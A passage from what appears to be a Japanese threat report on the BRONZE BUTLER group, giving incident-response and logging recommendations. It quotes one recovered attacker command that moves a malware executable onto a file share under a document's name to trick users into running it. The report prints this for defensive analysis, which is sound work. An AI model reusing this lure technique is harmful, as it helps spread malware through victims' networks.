schtasks\u306b\u3088\u308b\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u5f37\u5236\u5b9f\u884c\u30c6\u30af\u30cb\u30c3\u30af\u306e\u307b\u304b\u3001\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u30d5\u30a1\u30a4\u30eb\u30b5\u30fc\u30d0\u4e0a\u306b\u5b58\u5728\u3059\u308b\u6587\u66f8\u30d5\u30a1\u30a4\u30eb\u3068\u540c\u540d\u306e\u5b9f\u884c\u30d5\u30a1\u30a4\u30eb\u3092\u3001\u540c\u3058\u5834\u6240\u306b\u8a2d\u7f6e\u3057\u3066\u30af\u30ea\u30c3\u30af\u3055\u305b\u3088\u3046\u3068\u3059\u308b\u30c6\u30af\u30cb\u30c3\u30af\u3082\u99c6\u4f7f\u3057\u3066\u3044\u308b\u3053\u3068\u304c\u3001\u5fa9\u53f7\u3057\u305f\u30ed\u30b0\u304b\u3089\u78ba\u8a8d\u3067\u304d\u3066\u3044\u307e\u3059\u3002\nC:\\Users\\user01\\AppData\\Local\\Temp\\msupdat> move 2016xxxx.exe \\\\192.168.0.1\\d$\\\u5171\u6709\u30d5\u30a9\u30eb\u30c0\\\u4f1a\u8b70\u8b70\u4e8b\u9332.exe\n1 \u500b\u306e\u30d5\u30a1\u30a4\u30eb\u3092\u79fb\u52d5\u3057\u307e\u3057\u305f\u3002\nMedium Headline: 5.1 \u6a19\u7684\u578b\u653b\u6483\u306e\u65e9\u671f\u767a\u898b\u304a\u3088\u3073\u6291\u6b62\u306b\u6709\u52b9\u306a\u4e8b\u524d\u306e\u53d6\u308a\u7d44\u307f\n\u6a19\u7684\u578b\u653b\u6483\u3092\u65e9\u671f\u306b\u767a\u898b\u3059\u308b\u3001\u307e\u305f\u88ab\u5bb3\u3092\u672a\u7136(\u4e8b\u524d)\u306b\u8efd\u6e1b\u3059\u308b\u305f\u3081\u306e\u53d6\u308a\u7d44\u307f\u306f\u3001\u4e0b\u8a18\u306e\u3068\u304a\u308a\u3067\u3059\u3002\n\u524d\u8ff0\u306e\u3068\u304a\u308a\u3001\u4e00\u9023\u306e\u653b\u6483\u6d3b\u52d5\u306f\u88ab\u5bb3\u7d44\u7e54\u304c\u81ea\u8eab\u3067\u6c17\u3065\u304f\u30b1\u30fc\u30b9\u3088\u308a\u3082\u3001\u8b66\u5bdf\u3084 JPCERT\u30b3\u30fc\u30c7\u30a3\u30cd\u30fc\u30b7\u30e7\u30f3\u30bb\u30f3\u30bf\u30fc\u306e\u3088\u3046\u306a\u5916\u90e8\u6a5f\u95a2\u304b\u3089\u306e\u9023\u7d61\u3067\u6c17\u3065\u304f\u5834\u5408\u304c\u591a\u3044\u3067\u3059\u3002\u4eca\u5f8c\u540c\u69d8\u306e\u653b\u6483\u6d3b\u52d5\u304c\u884c\u308f\u308c\u305f\u5834\u5408\u306b\u3082\u305d\u306e\u50be\u5411\u306f\u7d9a\u304f\u3068\u8003\u3048\u3089\u308c\u307e\u3059\u3002\n\u3053\u3046\u3044\u3063\u305f\u7dca\u6025\u4e8b\u614b\u306b\u901f\u3084\u304b\u306b\u5bfe\u5fdc\u3067\u304d\u308b\u614b\u52e2\u3092\u81ea\u7d44\u7e54\u3067\u6e96\u5099\u3057\u3066\u304a\u304f\u3053\u3068\u304c\u3001\u5e73\u6642\u306b\u304a\u3044\u3066\u6700\u3082\u91cd\u8981\u306a\u53d6\u308a\u7d44\u307f\u306e\u4e00\u3064\u3067\u3059\u3002\u8fd1\u5e74\u3001SecureWorks\u3067\u3082 CSIRT(Computer Security Incident Response Team / \u30b7\u30fc\u30b5\u30fc\u30c8)\u3001\u3044\u308f\u3086\u308b\u30a4\u30f3\u30b7\u30c7\u30f3\u30c8\u5bfe\u5fdc\u30c1\u30fc\u30e0\u3092\u81ea\u7d44\u7e54\u3067\u69cb\u7bc9\u30fb\u904b\u7528\u3059\u308b\u305f\u3081\u306e\u652f\u63f4\u306b\u95a2\u3059\u308b\u554f\u3044\u5408\u308f\u305b\u304c\u5897\u52a0\u3057\u3066\u3044\u307e\u3059\u3002\u307e\u305f\u65e5\u672c\u30b7\u30fc\u30b5\u30fc\u30c8\u5354\u8b70\u4f1a(www.nca.gr.jp)\u3067\u306f\u4f1a\u54e1\u3068\u306a\u308b\u7d44\u7e54\u304c\u5e74\u3005\u500d\u5897\u3057\u3066\u3044\u308b\u3068\u3044\u3046\u4e8b\u5b9f\u3082\u3042\u308b\u3053\u3068\u304b\u3089\u3001\u65e5\u672c\u56fd\u5185\u306e\u5404\u7d44\u7e54\u306b\u304a\u3044\u3066\u30a4\u30f3\u30b7\u30c7\u30f3\u30c8\u5bfe\u5fdc\u3078\u306e\u95a2\u5fc3\u304c\u9ad8\u307e\u3063\u3066\u3044\u308b\u3053\u3068\u304c\u7aba\u3048\u307e\u3059\u3002\nCSIRT\u306b\u304a\u3051\u308b\u91cd\u8981\u306a\u5f79\u5272\u3068\u3057\u3066\u30a4\u30f3\u30b7\u30c7\u30f3\u30c8\u5bfe\u5fdc\u614b\u52e2\u3092\u6574\u3048\u3066\u304a\u304f\u3053\u3068\u306b\u52a0\u3048\u3001\u5e73\u6642\u304b\u3089\u7d44\u7e54\u5185\u5916\u306b\u5411\u3051\u3066\u60c5\u5831\u9023\u643a\u3092\u884c\u3063\u3066\u304a\u304f\u3068\u3068\u3082\u306b\u3001\u9023\u7d61\u7a93\u53e3\u306e\u6574\u5099\u3082\u4e0d\u53ef\u6b20\u3067\u3059\u3002\u8b66\u5bdf\u3084 JPCERT\u30b3\u30fc\u30c7\u30a3\u30cd\u30fc\u30b7\u30e7\u30f3\u30bb\u30f3\u30bf\u30fc\u3092\u542b\u3080\u5916\u90e8\u304b\u3089\u306e\u5831\u544a\u304c\u3042\u3063\u305f\u5834\u5408\u306b\u304a\u3044\u3066\u3082\u3001\u9069\u5207\u306a\u30a8\u30b9\u30ab\u30ec\u30fc\u30b7\u30e7\u30f3\u3092\u884c\u308f\u308c\u308b\u3088\u3046\u306b\u9023\u7d61\u30d5\u30ed\u30fc\u3092\u660e\u78ba\u306b\u3057\u3066\u304a\u304d\u3001\u7d44\u7e54\u5185\u306b\u3082\u5468\u77e5\u5fb9\u5e95\u3059\u308b\u3053\u3068\u304c\u6c42\u3081\u3089\u308c\u307e\u3059\u3002 \u52a0\u3048\u3066\u3001\u81ea\u7d44\u7e54\u3067\u5168\u3066\u306e\u30a4\u30f3\u30b7\u30c7\u30f3\u30c8\u5bfe\u5fdc\u30d7\u30ed\u30bb\u30b9\u3092\u5b8c\u7d50\u3059\u308b\u3053\u3068\u306f\u901a\u5e38\u56f0\u96e3\u3067\u3042\u308b\u305f\u3081\u3001\u6709\u4e8b\u306e\u969b\u306b\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5c02\u9580\u6a5f\u95a2\u3068\u901f\u3084\u304b\u306b\u9023\u643a\u3067\u304d\u308b\u3088\u3046\u306a\u5951\u7d04\u3092\u884c\u3063\u3066\u304a\u304f\u3053\u3068\u3092\u63a8\u5968\u3057\u307e\u3059\u3002\n\u30a4\u30f3\u30b7\u30c7\u30f3\u30c8\u304c\u767a\u751f\u3057\u305f\u969b\u3001\u4fb5\u5bb3\u3055\u308c\u305f\u7aef\u672b\u3084\u30b5\u30fc\u30d0\u3092\u30d5\u30a9\u30ec\u30f3\u30b8\u30c3\u30af\u8abf\u67fb\u3059\u308b\u305f\u3081\u306b\u30c7\u30a3\u30b9\u30af(\u30cf\u30fc\u30c9\u30c7\u30a3\u30b9\u30af\u306a\u3069)\u306e\u30a4\u30e1\u30fc\u30b8\u3092\u30b3\u30d4\u30fc\u3059\u308b\u624b\u7d9a\u304d\u3092\u884c\u3044\u307e\u3059\u3002\u30d5\u30a9\u30ec\u30f3\u30b8\u30c3\u30af\u30a4\u30e1\u30fc\u30b8\u306e\u65e9\u671f\u53d6\u5f97\u306f\u3001\u8abf\u67fb\u7d50\u679c\u306e\u7cbe\u5ea6\u3092\u4e0a\u3052\u308b\u305f\u3081\u306b\u91cd\u8981\u3068\u306a\u308b\u305f\u3081\u3001\u30d5\u30a9\u30ec\u30f3\u30b8\u30c3\u30af\u30a4\u30e1\u30fc\u30b8\u306e\u53d6\u5f97\u624b\u9806\u3092\u6574\u5099\u3059\u308b\u3053\u3068\u3092\u52e7\u3081\u307e\u3059\u3002\u307e\u305f\u3001\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5c02\u9580\u6a5f\u95a2\u306b\u8abf\u67fb\u3092\u4f9d\u983c\u3059\u308b\u5834\u5408\u306f\u3001\u30a4\u30e1\u30fc\u30b8\u30c7\u30fc\u30bf\u306e\u53d7\u3051\u6e21\u3057\u65b9\u6cd5\u306b\u3064\u3044\u3066\u3082\u4e8b\u524d\u306b\u5354\u8b70\u3057\u3066\u304a\u304f\u3053\u3068\u304c\u6709\u52b9\u3067\u3059\u3002\n\u9577\u671f\u306b\u304a\u3088\u3076\u653b\u6483\u8005\u306e\u6d3b\u52d5\u8ab2\u7a0b\u3067\u5229\u7528\u3055\u308c\u305f\u30de\u30eb\u30a6\u30a7\u30a2\u3084\u653b\u6483\u30c4\u30fc\u30eb\u306e\u4e00\u90e8\u304c\u3001\u30a2\u30f3\u30c1\u30a6\u30a4\u30eb\u30b9\u30bd\u30d5\u30c8\u30a6\u30a7\u30a2\u306b\u691c\u77e5\u3055\u308c\u308b\u5834\u5408\u304c\u3042\u308a\u307e\u3059\u3002 SecureWorks\u304c\u5bfe\u5fdc\u3057\u305f\u4e8b\u4f8b\u306e\u306a\u304b\u306b\u306f\u3001\u30a2\u30f3\u30c1\u30a6\u30a4\u30eb\u30b9\u30bd\u30d5\u30c8\u30a6\u30a7\u30a2\u304c\u691c\u4f53\u3092\u524a\u9664\u3057\u3066\u3057\u307e\u3044\u3001\u30a6\u30a4\u30eb\u30b9\u89e3\u6790\u7b49\u306e\u8a73\u7d30\u8abf\u67fb\u304c\u3067\u304d\u306a\u3044\u30b1\u30fc\u30b9\u304c\u3042\u308a\u307e\u3057\u305f\u3002\u30a2\u30f3\u30c1\u30a6\u30a4\u30eb\u30b9\u30bd\u30d5\u30c8\u30a6\u30a7\u30a2\u304c\u30de\u30eb\u30a6\u30a7\u30a2\u3092\u691c\u77e5\u3057\u305f\u5834\u5408\u3001\u4e00\u65e6\u9694\u96e2\u3059\u308b\u306a\u3069\u8a2d\u5b9a\u3092\u5909\u66f4\u3059\u308b\u3053\u3068\u3092\u63a8\u5968\u3057\u307e\u3059\u3002\n\u307e\u305f\u3001\u30a2\u30f3\u30c1\u30a6\u30a4\u30eb\u30b9\u30bd\u30d5\u30c8\u30a6\u30a7\u30a2\u304c\u30de\u30eb\u30a6\u30a7\u30a2\u3092\u691c\u77e5\u3057\u3066\u3044\u305f\u306b\u3082\u95a2\u308f\u3089\u305a\u3001\u793e\u5185\u60c5\u5831\u30b7\u30b9\u30c6\u30e0\u3084\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u62c5\u5f53\u8005\u304c\u611f\u67d3\u306e\u4e8b\u5b9f\u306b\u6c17\u3065\u304b\u306a\u3044\u3001\u3042\u308b\u3044\u306f\u653b\u6483\u306e\u91cd\u8981\u6027\u3092\u770b\u904e\u3057\u3066\u3057\u307e\u3046\u3053\u3068\u306b\u3088\u308a\u3001\u5bfe\u5fdc\u304c\u9045\u308c\u3066\u3044\u308b\u30b1\u30fc\u30b9\u3082\u6563\u898b\u3055\u308c\u3066\u3044\u307e\u3059\u3002\u30a8\u30f3\u30bf\u30fc\u30d7\u30e9\u30a4\u30ba\u5411\u3051\u30a2\u30f3\u30c1\u30a6\u30a4\u30eb\u30b9\u30bd\u30d5\u30c8\u30a6\u30a7\u30a2\u3092\u7528\u3044\u3066\u3044\u308b\u5834\u5408\u3001\u691c\u77e5\u72b6\u6cc1\u306e\u4e2d\u592e\u7ba1\u7406\u304c\u53ef\u80fd\u3067\u3059\u3002\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u62c5\u5f53\u8005\u306f\u7d44\u7e54\u5185\u306e\u30a6\u30a4\u30eb\u30b9\u691c\u77e5\u72b6\u6cc1\u3092\u5b9a\u671f\u7684\u306b\u76e3\u8996\u3059\u308b\u3053\u3068\u3001\u305d\u3057\u3066\u30de\u30eb\u30a6\u30a7\u30a2\u691c\u77e5\u540d\u306a\u3069\u3092\u7528\u3044\u3066\u3001\u30c8\u30ed\u30a4\u306e\u6728\u99ac\u3084\u30d0\u30c3\u30af\u30c9\u30a2\u306b\u5206\u985e\u3055\u308c\u308b\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u611f\u67d3\u304c\u3042\u3063\u305f\u5834\u5408\u306b\u306f\u3001\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5c02\u9580\u30d9\u30f3\u30c0\u306a\u3069\u306b\u8abf\u67fb\u30fb\u5bfe\u5fdc\u3092\u4f9d\u983c\u3059\u308b\u3053\u3068\u3092\u691c\u8a0e\u3057\u3066\u304f\u3060\u3055\u3044\u3002\n\u88ab\u5bb3\u306b\u6c17\u3065\u304d\u3001\u30a4\u30f3\u30b7\u30c7\u30f3\u30c8\u5bfe\u5fdc\u3092\u884c\u3046\u3053\u3068\u306b\u306a\u3063\u305f\u5834\u5408\u3001\u653b\u6483\u306e\u72b6\u6cc1\u3084\u5f71\u97ff\u7bc4\u56f2\u3092\u7279\u5b9a\u3059\u308b\u305f\u3081\u306b\u901a\u4fe1\u3084\u30b7\u30b9\u30c6\u30e0\u306e\u30ed\u30b0\u89e3\u6790\u304c\u5fc5\u8981\u3068\u306a\u308a\u307e\u3059\u3002BRONZE BUTLER\u306b\u3088\u308b\u6a19\u7684\u578b\u653b\u6483\u306f\u3001HTTP\u901a\u4fe1\u7d4c\u7531\u3067\u4fb5\u5165\u304c\u884c\u308f\u308c\u3066\u304a\u308a\u3001 Windows\u7cfb\u30b7\u30b9\u30c6\u30e0\u304c\u5bfe\u8c61\u3068\u306a\u3063\u3066\u3044\u308b\u305f\u3081\u3001\u30d7\u30ed\u30ad\u30b7\u30ed\u30b0\u3068 Windows\u306e\u30a4\u30d9\u30f3\u30c8\u30ed\u30b0\u306f\u975e\u5e38\u306b\u91cd\u8981\u306a\u60c5\u5831\u6e90\u3068\u306a\u308a\u307e\u3059\u3002\u3057\u304b\u3057\u306a\u304c\u3089\u3001SecureWorks\u304c\u5bfe\u5fdc\u3057\u305f\u4e2d\u306b\u306f\u3001\u3044\u304f\u3064\u304b\u306e\u8981\u56e0\u306e\u305f\u3081\u5341\u5206\u306b\u30ed\u30b0\u89e3\u6790\u304c\u884c\u3046\u3053\u3068\u304c\u3067\u304d\u306a\u304b\u3063\u305f\u4e8b\u4f8b\u304c\u3042\u308a\u307e\u3057\u305f\u3002\n\u4ee5\u4e0b\u306b\u6319\u3052\u308b\u70b9\u3092\u518d\u5ea6\u78ba\u8a8d\u3057\u3001\u88ab\u5bb3\u3092\u53d7\u3051\u305f\u969b\u306b\u8a73\u7d30\u306a\u8abf\u67fb\u304c\u884c\u3048\u308b\u3088\u3046\u6e96\u5099\u3057\u3066\u304a\u304f\u3053\u3068\u3092\u63a8\u5968\u3057\u307e\u3059\u3002\n\u2022 \u30d7\u30ed\u30ad\u30b7\u30ed\u30b0\u53d6\u5f97\u306b\u95a2\u3059\u308b\u6ce8\u610f\u70b9\no \u30d7\u30ed\u30ad\u30b7\u3092\u81ea\u7d44\u7e54\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u5185\u306b\u8a2d\u7f6e\u3057\u3066\u3044\u308b\u306b\u3082\u95a2\u308f\u3089\u305a\u3001\u30d7\u30ed\u30ad\u30b7\u3092\u7d4c\u7531\u305b\u305a\u30a4\u30f3\u30bf\u30fc\u30cd\u30c3\u30c8\u901a\u4fe1\u304c\u884c\u308f\u308c\u3066\u3044\u306a\u3044\u304b\u78ba\u8a8d\no \u30d7\u30ed\u30ad\u30b7\u30ed\u30b0\u306f GET\u30ea\u30af\u30a8\u30b9\u30c8\u306e\u30d1\u30e9\u30e1\u30fc\u30bf\u307e\u3067\u53d6\u308c\u3066\u3044\u308b\u304b\u3001\u307e\u305f\u305d\u306e\u30d1\u30e9\u30e1\u30fc\u30bf\u304c\u5341\u5206\u306a\u9577\u3055(\u6700\u5927\u5343\u6587\u5b57\u7a0b\u5ea6)\u53d6\u308c\u308b\u3088\u3046\u306b\u306a\u3063\u3066\u3044\u308b\u304b\u3092\u78ba\u8a8d\no Squid\u306f\u30c7\u30d5\u30a9\u30eb\u30c8\u8a2d\u5b9a\u3067\u306f GET\u30ea\u30af\u30a8\u30b9\u30c8\u306e\u30d1\u30e9\u30e1\u30fc\u30bf\u3092\u53d6\u5f97\u3057\u306a\u3044\u305f\u3081\u3001\u53d6\u5f97\u3059\u308b\u3088\u3046\u8a2d\u5b9a\u3092\u5909\u66f4\no \u5341\u5206\u306a\u671f\u9593\u306e\u30ed\u30b0\u3092\u53d6\u5f97\u3057\u3001\u4fdd\u5b58\u3057\u3066\u3044\u308b\u304b\u3092\u78ba\u8a8d(\u53ef\u80fd\u3067\u3042\u308c\u3070\u30aa\u30d5\u30e9\u30a4\u30f3\u3067\u6570\u5e74\u9593\u5206\u306e\u30d7\u30ed\u30ad\u30b7\u30ed\u30b0\u3092\u4fdd\u5b58\u3067\u304d\u3066\u3044\u308b\u3053\u3068\u304c\u671b\u307e\u3057\u3044)\no \u30d7\u30ed\u30ad\u30b7\u30b5\u30fc\u30d0\u304c\u591a\u6bb5\u3067\u7d44\u307e\u308c\u3066\u3044\u308b\u5834\u5408\u3001\u653b\u6483\u8005\u306e\u884c\u52d5\u304c\u8ffd\u8de1\u3067\u304d\u308b\u3088\u3046\u306a\u30ed\u30b0\u53d6\u5f97\u304c\u3067\u304d\u308b\u3088\u3046\u306a\u8a2d\u5b9a\u306b\u5909\u66f4\no DHCP\u3092\u4f7f\u7528\u3057\u3066\u3044\u308b\u5834\u5408\u306b\u306f\u3001\u30ed\u30b0\u306b\u6b8b\u3063\u305f IP\u30a2\u30c9\u30ec\u30b9\u3068\u7aef\u672b\u3092\u3059\u3050\u306b\u7d10\u4ed8\u3051\u3089\u308c\u308b\u3088\u3046\u306b\u306a\u3063\u3066\u3044\u308b\u304b\u78ba\u8a8d\n\u2022 Windows\u30a4\u30d9\u30f3\u30c8\u30ed\u30b0\u53d6\u5f97\u306b\u95a2\u3059\u308b\u6ce8\u610f\u70b9\no \u6700\u5927\u30ed\u30b0\u30b5\u30a4\u30ba\u3092\u5909\u66f4\u3057\u3066\u5341\u5206\u306a\u671f\u9593\u306e\u30ed\u30b0\u3092\u53d6\u5f97\u3067\u304d\u308b\u3088\u3046\u8a2d\u5b9a\no \u53e4\u3044\u30ed\u30b0\u3092\u4e0a\u66f8\u304d\u3067\u306f\u306a\u304f\u30a2\u30fc\u30ab\u30a4\u30d6\u3059\u308b\u3088\u3046\u306b\u8a2d\u5b9a\u3092\u5909\u66f4\no \u30ed\u30b0\u30a4\u30f3\u306e\u6210\u529f\u3068\u5931\u6557\u3060\u3051\u3067\u306f\u306a\u304f\u3001\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u30bf\u30b9\u30af\u306e\u4f5c\u6210\u3001NTLM\u8a8d\u8a3c\u3001Kerberos\u8a8d\u8a3c\u3001\u30d1\u30b9\u30ef\u30fc\u30c9\u5909\u66f4\u3001\u30a4\u30d9\u30f3\u30c8\u30ed\u30b0\u306e\u6d88\u53bb\u3068\u3044\u3063\u305f\u60c5\u5831\u3082\u53d6\u5f97\u3067\u304d\u308b\u3088\u3046\u306b\u8a2d\u5b9a\u3092\u5909\u66f4\n\u307e\u305f Microsoft\u793e\u304c\u63d0\u4f9b\u3059\u308b Sysmon\u3092\u5c0e\u5165\u3059\u308b\u3053\u3068\u3082\u975e\u5e38\u306b\u52b9\u679c\u7684\u3067\u3059\u3002BRONZE BUTLER\u306b\u3088\u308b\u653b\u6483\u3067\u306f\u3001\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u901a\u4fe1\u304c\u6697\u53f7\u5316\u3055\u308c\u3066\u3044\u308b\u305f\u3081\u3001\u653b\u6483\u8005\u306e\u884c\u52d5\u3092\u8ffd\u8de1\u3059\u308b\u3053\u3068\u306f\u5bb9\u6613\u3067\u306f\u3042\u308a\u307e\u305b\u3093\u3002\u3057\u304b\u3057\u306a\u304c\u3089 Sysmon\u3092\u5c0e\u5165\u3059\u308b\u3053\u3068\u306b\u3088\u308a\u3001 \u653b\u6483\u8005\u304c\u4fb5\u5165\u3057\u305f Windows\u7aef\u672b\u306b\u304a\u3051\u308b\u884c\u52d5\u3092\u6bd4\u8f03\u7684\u7c21\u5358\u306b\u7279\u5b9a\u3059\u308b\u3053\u3068\u304c\u53ef\u80fd\u3068\u306a\u308a\u307e\u3059\u3002\u5b9f\u969b\u306b\u3001Sysmon\u3092\u5c0e\u5165\u3057\u3066\u3044\u305f\u305f\u3081\u306b\u653b\u6483\u8005\u306e\u5b9f\u884c\u3057\u305f\u30b3\u30de\u30f3\u30c9\u3092\u7279\u5b9a\u3067\u304d\u305f\u4e8b\u4f8b\u3082\u3042\u308a\u307e\u3057\u305f\u3002\nSysmon\n\u672c\u30ec\u30dd\u30fc\u30c8\u3067\u89e3\u8aac\u3057\u3066\u304d\u305f\u3068\u304a\u308a\u3001\u901a\u5e38 BRONZE BUTLER\u306e\u6a19\u7684\u578b\u653b\u6483\u3092\u691c\u77e5\u3059\u308b\u3053\u3068\u306f\u56f0\u96e3\u3067\u3042\u308b\u305f\u3081\u3001\u7c21\u6613\u7684\u306a\u30ed\u30b0\u3084\u30b7\u30b9\u30c6\u30e0\u306e\u8abf\u67fb\u3092\u81ea\u7d44\u7e54\u3067\u884c\u3044\u3001\u653b\u6483\u306e\u75d5\u8de1\u304c\u306a\u3044\u304b\u78ba\u8a8d\u3059\u308b\u3053\u3068\u3092\u63a8\u5968\u3057\u307e\u3059\u3002\u4e0b\u8a18\u306e\u89b3\u70b9\u3067\u306e\u8abf\u67fb\u306f\u6709\u52b9\u3067\u3042\u308b\u3068\u8003\u3048\u307e\u3059\u3002(\u672c\u30ec\u30dd\u30fc\u30c8 Appendix A: \u653b\u6483\u6d3b\u52d5\u691c\u77e5\u306b\u6709\u52b9\u306a\u60c5\u5831\u306b\u8a73\u7d30\u306a\u60c5\u5831\u3092\u8a18\u8f09)\n\u2022 \u30de\u30eb\u30a6\u30a7\u30a2\u304c\u4f7f\u7528\u3059\u308b URL\u306e\u30d1\u30bf\u30fc\u30f3\u3084 User Agent\u306e\u691c\u7d22(\u30d7\u30ed\u30ad\u30b7\u30ed\u30b0\u306a\u3069)\n\u2022 BRONZE BUTLER\u304c\u4f7f\u7528\u3059\u308b\u5b9f\u884c\u30d5\u30a1\u30a4\u30eb\u540d\u306e\u691c\u7d22(\u30b7\u30b9\u30c6\u30e0\u4e0a)\n\u2022 SKYSEA Client View\u306e\u30ed\u30b0\n\u2022 Active Directory\u4e0a\u306e\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u30bf\u30b9\u30af\n\u2022 \u30ec\u30b8\u30b9\u30c8\u30ea\u30a8\u30f3\u30c8\u30ea\nBRONZE BUTLER\u306b\u9650\u3089\u305a\u3001\u6a19\u7684\u578b\u653b\u6483\u304c\u7d44\u7e54\u306e\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u306b\u4e00\u5ea6\u4fb5\u5165\u3059\u308b\u3068\u3001\u6a2a\u65ad\u7684\u4fb5\u5bb3\u3092\u884c\u3044\u7aef\u672b\u304b\u3089\u7aef\u672b\u3078\u3068\u5f71\u97ff\u7bc4\u56f2\u3092\u5e83\u3052\u3066\u3044\u304d\u307e\u3059\u3002\u305d\u306e\u305f\u3081\u3001\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u901a\u4fe1\u3060\u3051\u3067\u306f\u306a\u304f\u3001E\u30e1\u30fc\u30eb\u3084\u7aef\u672b\u30ec\u30d9\u30eb\u3067\u306e\u6d3b\u52d5\u3092\u5b9a\u5e38\u7684\u306b\u76e3\u8996\u3059\u308b\u3053\u3068\u304c\u91cd\u8981\u3067\u3059\u3002\nE\u30e1\u30fc\u30eb\u306e\u6dfb\u4ed8\u30d5\u30a1\u30a4\u30eb\u3001\u7aef\u672b\u4e0a\u3067\u306e\u5b9f\u884c\u30d5\u30a1\u30a4\u30eb\u3084 Windows\u30b3\u30de\u30f3\u30c9\u3001\u305d\u3057\u3066\u7279\u6a29\u30e6\u30fc\u30b6\u306e\u5229\u7528\u306a\u3069\u3055\u307e\u3056\u307e\u306a\u89b3\u70b9\u304b\u3089\u306e\u76e3\u8996\u304c\u5fc5\u8981\u3068\u306a\u308a\u307e\u3059\u306e\u3067\u3001\u672c\u30ec\u30dd\u30fc\u30c8\u3067\u89e3\u8aac\u3057\u305f BRONZE BUTLER\u306e\u653b\u6483\u624b\u6cd5\u3092\u53c2\u8003\u306b\u76e3\u8996\u9805\u76ee\u3092\u8a2d\u5b9a\u3059\u308b\u3053\u3068\u3092\u63a8\u5968\u3057\u307e\u3059\u3002\n\u3054\u53c2\u8003\u307e\u3067\u306b SecureWorks\u3067\u63d0\u4f9b\u3059\u308b\u30bd\u30ea\u30e5\u30fc\u30b7\u30e7\u30f3\u3067\u306f\u3001\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u901a\u4fe1\u3001E\u30e1\u30fc\u30eb\u3001\u30a8\u30f3\u30c9\u30dd\u30a4\u30f3\u30c8(\u7aef\u672b)\u3092\u76e3\u8996\u5bfe\u8c61\u3068\u3057\u3066\u3044\u307e\u3059\u3002\nAETD Red Cloak:\nAMPD:\n\u653b\u6483\u8005\u304c\u6a2a\u65ad\u7684\u4fb5\u5bb3\u3092\u884c\u3046\u969b\u306b\u4f7f\u7528\u3059\u308b\u591a\u304f\u306e\u30b3\u30de\u30f3\u30c9\u306f\u3001net\u3084 ping\u3001schtasks\u3068\u3044\u3063\u305f Windows\u6a19\u6e96\u30b3\u30de\u30f3\u30c9\u3067\u3059\u304c\u3001\u901a\u5e38\u306e\u696d\u52d9\u306b\u304a\u3044\u3066\u30e6\u30fc\u30b6\u304c\u3053\u308c\u3089\u306e\u30b3\u30de\u30f3\u30c9\u3092\u4f7f\u7528\u3059\u308b\u6a5f\u4f1a\u306f\u591a\u304f\u3042\u308a\u307e\u305b\u3093\u3002\u305d\u306e\u305f\u3081\u3001\u524d\u8ff0\u306e\u901a\u308a\u3001\u30b3\u30de\u30f3\u30c9\u5b9f\u884c\u306e\u76e3\u8996\u306b\u52a0\u3048\u3001\u653b\u6483\u306b\u591a\u7528\u3055\u308c\u308b Windows\u6a19\u6e96\u30b3\u30de\u30f3\u30c9\u306e\u5b9f\u884c\u3092\u5236\u9650\u3059\u308b\u3053\u3068\u3067\u3001\u4fb5\u5165\u5f8c\u306e\u88ab\u5bb3\u304c\u8efd\u6e1b\u3055\u308c\u308b\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002\n\u4ee5\u4e0b\u3092\u53c2\u8003\u306b\u3001\u30b3\u30de\u30f3\u30c9\u306e\u5236\u9650\u3092\u691c\u8a0e\u3059\u308b\u3053\u3068\u3092\u63a8\u5968\u3057\u307e\u3059\u3002\n\u653b\u6483\u8005\u304c\u60aa\u7528\u3059\u308b Windows\u30b3\u30de\u30f3\u30c9(2015-12-02)\nBRONZE BUTLER\u306b\u9650\u3089\u305a\u6a19\u7684\u578b\u653b\u6483\u3067\u306f\u3001\u30c9\u30e1\u30a4\u30f3\u7ba1\u7406\u8005\u30a2\u30ab\u30a6\u30f3\u30c8\u306a\u3069\u7279\u6a29\u30e6\u30fc\u30b6\u306e\u8a8d\u8a3c\u60c5\u5831\u3092\u72d9\u3046\u653b\u6483\u304c\u5e38\u5957\u624b\u6bb5\u3068\u306a\u3063\u3066\u3044\u307e\u3059\u3002\u524d\u8ff0\u306e\u3068\u304a\u308a\u3001\u7279\u6a29\u30e6\u30fc\u30b6\u306e\u5229\u7528\u72b6\u6cc1\u3092\u76e3\u8996\u3059\u308b\u3053\u3068\u306b\u52a0\u3048\u3001\u5229\u7528\u7bc4\u56f2\u3068\u7528\u9014\u3092\u6700\u5c0f\u9650\u306b\u3068\u3069\u3081\u308b\u3053\u3068\u306b\u3088\u308a\u3001\u653b\u6483\u3055\u308c\u305f\u5834\u5408\u306e\u5f71\u97ff\u3092\u8efd\u6e1b\u3067\u304d\u308b\u53ef\u80fd\u6027\u304c\u9ad8\u307e\u308a\u307e\u3059\u3002\u307e\u305f\u3001\u30ef\u30f3\u30bf\u30a4\u30e0\u30d1\u30b9\u30ef\u30fc\u30c9\u3092\u4f7f\u7528\u3057\u305f\u4e8c\u8981\u7d20\u8a8d\u8a3c\u3092\u4f7f\u7528\u3059\u308b\u3053\u3068\u3082\u691c\u8a0e\u3057\u3066\u304f\u3060\u3055\u3044\u3002\u30c9\u30e1\u30a4\u30f3\u3067\u306e\u30b0\u30eb\u30fc\u30d7\u30dd\u30ea\u30b7\u30fc\u306a\u3069\u3067\u3001\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u7d4c\u7531\u3042\u308b\u3044\u306f\u30ea\u30e2\u30fc\u30c8\u30a2\u30af\u30bb\u30b9\u5236\u9650\u306e\u9069\u7528\u3092\u63a8\u5968\u3057\u307e\u3059\u304c\u3001\u30b7\u30b9\u30c6\u30e0\u69cb\u6210\u3084\u904b\u7528\u4e0a\u96e3\u3057\u3044\u5834\u5408\u306f\u3001\u5b9a\u3081\u305f\u30eb\u30fc\u30eb\u306b\u57fa\u3065\u3044\u3066\u904b\u7528\u306e\u5fb9\u5e95\u3092\u56f3\u308b\u3053\u3068\u3092\u63a8\u5968\u3057\u307e\u3059\u3002\nActive 